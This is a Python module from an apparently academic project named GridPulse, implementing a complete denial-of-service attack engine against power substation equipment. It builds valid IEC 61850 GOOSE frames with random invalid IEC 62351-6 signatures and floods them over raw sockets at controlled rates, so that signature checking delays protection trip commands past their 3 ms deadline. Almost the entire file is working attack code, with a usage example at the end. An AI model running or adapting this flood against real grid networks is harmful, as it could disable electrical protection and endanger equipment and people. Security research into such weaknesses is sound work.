"""
CIL-DoS — Crypto-Induced Latency Denial of Service
====================================================

Core attack module for the GridPulse research. Generates high-rate
floods of structurally valid GOOSE frames bearing INVALID cryptographic
signatures per IEC 62351-6.

Attack Mechanism:
    Each frame is structurally valid (correct TLV encoding, valid field
    values, proper EtherType) but carries a deliberately invalid HMAC
    or digital signature. The receiving substation IED must perform
    FULL signature verification before it can reject the frame. Under
    flood conditions, the verification queue saturates, causing
    legitimate trip commands to exceed the 3 ms safety deadline.

    λ_attack >> μ_verify  ⟹  queue saturation  ⟹  deadline violation

This is the central research contribution: demonstrating that the
security mechanism (IEC 62351-6) itself becomes the attack vector.

Platform: Linux only (requires CAP_NET_RAW or root)

⚠️  For authorized security research on isolated test networks only.
"""

from __future__ import annotations

import os
import struct
import threading
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

from gridpulse.protocols.goose import GOOSEFrame, GOOSEPDU, EthernetHeader
from gridpulse.protocols.goose_security import (
    SecurityAlgorithm,
    SecurityExtension,
    HMAC_SHA256_LEN,
)
from gridpulse.attacks.goose_inject import GOOSEInjector, InjectionStats


# ============================================================================
# CIL-DoS Statistics
# ============================================================================

@dataclass
class CILDoSStats:
    """Real-time CIL-DoS attack statistics."""
    packets_sent: int = 0
    bytes_sent: int = 0
    target_rate_pps: int = 0
    actual_rate_pps: float = 0.0
    duration_seconds: float = 0.0
    errors: int = 0
    algorithm: str = ""
    is_running: bool = False

    def __str__(self) -> str:
        return (
            f"╔═══════════════════════════════════════════╗\n"
            f"║        CIL-DoS Attack Statistics          ║\n"
            f"╠═══════════════════════════════════════════╣\n"
            f"║  Status:      {'🔴 ACTIVE' if self.is_running else '⚫ STOPPED':>20}  ║\n"
            f"║  Algorithm:   {self.algorithm:>20}  ║\n"
            f"║  Packets:     {self.packets_sent:>20,}  ║\n"
            f"║  Bytes:       {self.bytes_sent:>20,}  ║\n"
            f"║  Target Rate: {self.target_rate_pps:>17,} pps  ║\n"
            f"║  Actual Rate: {self.actual_rate_pps:>15,.1f} pps  ║\n"
            f"║  Duration:    {self.duration_seconds:>17.2f}  s  ║\n"
            f"║  Errors:      {self.errors:>20,}  ║\n"
            f"╚═══════════════════════════════════════════╝"
        )


# ============================================================================
# CIL-DoS Frame Builder
# ============================================================================

class CILDoSFrameBuilder:
    """
    Builds structurally valid GOOSE frames with invalid signatures.

    The frames are designed to:
    1. Pass initial EtherType/structure checks (not dropped by basic filters)
    2. Contain valid ASN.1 BER-TLV encoding
    3. Carry an IEC 62351-6 security extension with INVALID signature bytes
    4. Force the defender to perform full cryptographic verification
    """

    def __init__(
        self,
        dst_mac: str = "01:0c:cd:01:00:01",
        src_mac: str = "08:00:27:aa:bb:cc",
        gocb_ref: str = "SubstationA/LLN0$GO$gcbTrip",
        dat_set: str = "SubstationA/LLN0$TripDataSet",
        go_id: str = "GOOSE_Trip_01",
        app_id: int = 0x0001,
        conf_rev: int = 1,
        algorithm: SecurityAlgorithm = SecurityAlgorithm.HMAC_SHA256,
        key_id: int = 0x00000001,
    ):
        self._dst_mac = self._parse_mac(dst_mac)
        self._src_mac = self._parse_mac(src_mac)
        self._gocb_ref = gocb_ref
        self._dat_set = dat_set
        self._go_id = go_id
        self._app_id = app_id
        self._conf_rev = conf_rev
        self._algorithm = algorithm
        self._key_id = key_id

    @staticmethod
    def _parse_mac(mac_str: str) -> bytes:
        """Parse MAC address string to bytes."""
        return bytes(int(b, 16) for b in mac_str.split(":"))

    def build_template(self, st_num: int = 1, sq_num: int = 0) -> bytes:
        """
        Build a complete CIL-DoS frame template.

        The frame is structurally valid but carries deliberately
        invalid signature bytes (random data).
        """
        # Build GOOSE PDU payload using BER-TLV encoding
        pdu_fields = b""
        pdu_fields += self._ber_tlv(0x80, self._gocb_ref.encode())  # gocbRef
        pdu_fields += self._ber_tlv(0x81, self._encode_int(2000))    # timeAllowedToLive
        pdu_fields += self._ber_tlv(0x82, self._dat_set.encode())    # datSet
        pdu_fields += self._ber_tlv(0x83, self._go_id.encode())      # goID

        # Timestamp (current UTC)
        now = time.time()
        t_sec = int(now)
        t_frac = int((now % 1) * 0xFFFFFF)
        t_qual = 0x00
        pdu_fields += self._ber_tlv(0x84, struct.pack(">I", t_sec) +
                                     struct.pack(">I", (t_frac << 8) | t_qual))

        pdu_fields += self._ber_tlv(0x85, self._encode_int(st_num))  # stNum
        pdu_fields += self._ber_tlv(0x86, self._encode_int(sq_num))  # sqNum
        pdu_fields += self._ber_tlv(0x87, b"\x00")                   # simulation=False
        pdu_fields += self._ber_tlv(0x88, self._encode_int(self._conf_rev))  # confRev
        pdu_fields += self._ber_tlv(0x89, b"\x00")                   # ndsCom=False
        pdu_fields += self._ber_tlv(0x8A, self._encode_int(1))       # numDatSetEntries

        # allData: single Boolean False (no actual trip)
        all_data_content = self._ber_tlv(0x83, b"\x00")
        pdu_fields += self._ber_tlv(0xAB, all_data_content)

        # Wrap in outer GOOSE PDU tag (0x61)
        goose_pdu = self._ber_tlv(0x61, pdu_fields)

        # Build invalid security extension
        security_ext = self._build_invalid_security(goose_pdu)

        # GOOSE header
        total_apdu_len = 8 + len(goose_pdu) + len(security_ext)
        goose_header = struct.pack(">HH HH",
            self._app_id,       # APPID
            total_apdu_len,     # Length
            0x0000,             # Reserved1
            0x0000,             # Reserved2
        )

        # Ethernet header
        eth_header = self._dst_mac + self._src_mac + struct.pack(">H", 0x88B8)

        return eth_header + goose_header + goose_pdu + security_ext

    def _build_invalid_security(self, goose_pdu: bytes) -> bytes:
        """
        Build an IEC 62351-6 security extension with INVALID signature.

        The signature bytes are random — this is the core CIL-DoS mechanism.
        The structure is valid, forcing the receiver to parse it and
        attempt verification before discovering the signature is invalid.
        """
        # Determine signature length based on algorithm
        sig_lengths = {
            SecurityAlgorithm.HMAC_SHA256: 32,
            SecurityAlgorithm.HMAC_SHA256_TRUNCATED_80: 10,
            SecurityAlgorithm.RSA_2048_SHA256: 256,
            SecurityAlgorithm.ECDSA_P256_SHA256: 72,
        }
        sig_len = sig_lengths.get(self._algorithm, 32)

        # Random invalid signature
        fake_signature = os.urandom(sig_len)

        # Build security extension payload
        payload = struct.pack(">B I I d",
            self._algorithm.value,
            self._key_id,
            int(time.time()),      # counter (looks legitimate)
            time.time(),           # timestamp
        )
        payload += fake_signature

        # BER-TLV wrap
        return self._ber_tlv(0x80, payload)

    def build_batch(
        self,
        count: int,
        base_st_num: int = 1,
        base_sq_num: int = 0,
    ) -> list[bytes]:
        """
        Pre-build a batch of frames with incrementing sqNum.

        Pre-building avoids per-packet construction overhead during
        high-rate flooding.
        """
        frames = []
        for i in range(count):
            frame = self.build_template(
                st_num=base_st_num,
                sq_num=base_sq_num + i,
            )
            frames.append(frame)
        return frames

    @staticmethod
    def _ber_tlv(tag: int, value: bytes) -> bytes:
        """Encode a BER Tag-Length-Value triplet."""
        length = len(value)
        if length < 0x80:
            return bytes([tag, length]) + value
        elif length < 0x100:
            return bytes([tag, 0x81, length]) + value
        else:
            return bytes([tag, 0x82]) + struct.pack(">H", length) + value

    @staticmethod
    def _encode_int(value: int) -> bytes:
        """Encode an integer in minimal BER integer format."""
        if value == 0:
            return b"\x00"
        result = []
        v = value
        while v > 0:
            result.insert(0, v & 0xFF)
            v >>= 8
        # Add leading zero if MSB is set (to avoid negative interpretation)
        if result[0] & 0x80:
            result.insert(0, 0)
        return bytes(result)


# ============================================================================
# CIL-DoS Attack Engine
# ============================================================================

class CILDoSAttack:
    """
    Crypto-Induced Latency Denial of Service attack engine.

    Floods the target with structurally valid GOOSE frames carrying
    invalid cryptographic signatures. Each frame forces the receiver
    to expend CPU cycles on signature verification before rejection.

    The attack exploits the fundamental asymmetry:
        Attack cost:  O(1) per frame (random bytes for signature)
        Defense cost: O(crypto) per frame (full HMAC/RSA/ECDSA verify)

    Under sufficient flood rate (λ >> μ), the verification queue
    saturates and legitimate protection commands miss their 3 ms
    safety deadline.
    """

    def __init__(
        self,
        interface: str,
        target_mac: str = "01:0c:cd:01:00:01",
        src_mac: str = "08:00:27:aa:bb:cc",
        algorithm: SecurityAlgorithm = SecurityAlgorithm.HMAC_SHA256,
        key_id: int = 0x00000001,
        rate_pps: int = 10000,
        duration_seconds: float = 30.0,
        gocb_ref: str = "SubstationA/LLN0$GO$gcbTrip",
        dat_set: str = "SubstationA/LLN0$TripDataSet",
        go_id: str = "GOOSE_Trip_01",
    ):
        self._interface = interface
        self._algorithm = algorithm
        self._rate_pps = rate_pps
        self._duration = duration_seconds

        self._frame_builder = CILDoSFrameBuilder(
            dst_mac=target_mac,
            src_mac=src_mac,
            gocb_ref=gocb_ref,
            dat_set=dat_set,
            go_id=go_id,
            algorithm=algorithm,
            key_id=key_id,
        )

        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._stats = CILDoSStats(
            target_rate_pps=rate_pps,
            algorithm=str(algorithm),
        )
        self._stop_event = threading.Event()

    def start(self) -> None:
        """
        Start the CIL-DoS flood in a background thread.

        The flood runs until stop() is called or duration expires.
        """
        if self._running:
            raise RuntimeError("Attack already running")

        self._running = True
        self._stats.is_running = True
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._flood_loop, daemon=True)
        self._thread.start()

    def stop(self) -> CILDoSStats:
        """Stop the CIL-DoS flood and return final statistics."""
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=5.0)
        self._running = False
        self._stats.is_running = False
        return self._stats

    def get_stats(self) -> CILDoSStats:
        """Get current attack statistics (thread-safe snapshot)."""
        return CILDoSStats(
            packets_sent=self._stats.packets_sent,
            bytes_sent=self._stats.bytes_sent,
            target_rate_pps=self._stats.target_rate_pps,
            actual_rate_pps=self._stats.actual_rate_pps,
            duration_seconds=self._stats.duration_seconds,
            errors=self._stats.errors,
            algorithm=self._stats.algorithm,
            is_running=self._stats.is_running,
        )

    def _flood_loop(self) -> None:
        """
        Main flood loop. Runs in background thread.

        Pre-builds frame templates for maximum throughput, then
        sends them at the target rate using precise timing.
        """
        # Pre-build frame batch (avoids per-packet construction)
        batch_size = min(self._rate_pps, 1000)
        templates = self._frame_builder.build_batch(
            count=batch_size,
            base_st_num=1,
            base_sq_num=0,
        )

        interval = 1.0 / self._rate_pps if self._rate_pps > 0 else 0
        start_time = time.monotonic()
        template_idx = 0

        try:
            injector = GOOSEInjector(self._interface)
        except (RuntimeError, PermissionError, OSError) as e:
            self._stats.errors += 1
            self._stats.is_running = False
            self._running = False
            return

        try:
            while not self._stop_event.is_set():
                elapsed = time.monotonic() - start_time
                if elapsed >= self._duration:
                    break

                # Send frame
                frame = templates[template_idx % len(templates)]
                try:
                    sent = injector.send_frame(frame)
                    self._stats.packets_sent += 1
                    self._stats.bytes_sent += sent
                except OSError:
                    self._stats.errors += 1

                template_idx += 1

                # Update stats
                self._stats.duration_seconds = elapsed
                if elapsed > 0:
                    self._stats.actual_rate_pps = self._stats.packets_sent / elapsed

                # Rate control
                if interval > 0:
                    expected_time = start_time + (template_idx * interval)
                    sleep_time = expected_time - time.monotonic()
                    if sleep_time > 0:
                        time.sleep(sleep_time)

        finally:
            injector.close()
            self._stats.duration_seconds = time.monotonic() - start_time
            if self._stats.duration_seconds > 0:
                self._stats.actual_rate_pps = (
                    self._stats.packets_sent / self._stats.duration_seconds
                )
            self._running = False
            self._stats.is_running = False

    @property
    def is_running(self) -> bool:
        return self._running


if __name__ == "__main__":
    print("GridPulse CIL-DoS Attack Engine")
    print("=" * 50)
    print()
    print("Crypto-Induced Latency Denial of Service")
    print("Attack vector: IEC 62351-6 signature verification overhead")
    print()
    print("Usage:")
    print("  attack = CILDoSAttack(")
    print("      interface='eth0',")
    print("      algorithm=SecurityAlgorithm.RSA_2048_SHA256,")
    print("      rate_pps=50000,")
    print("      duration_seconds=60,")
    print("  )")
    print("  attack.start()")
    print("  # ... monitor stats ...")
    print("  stats = attack.stop()")
    print("  print(stats)")
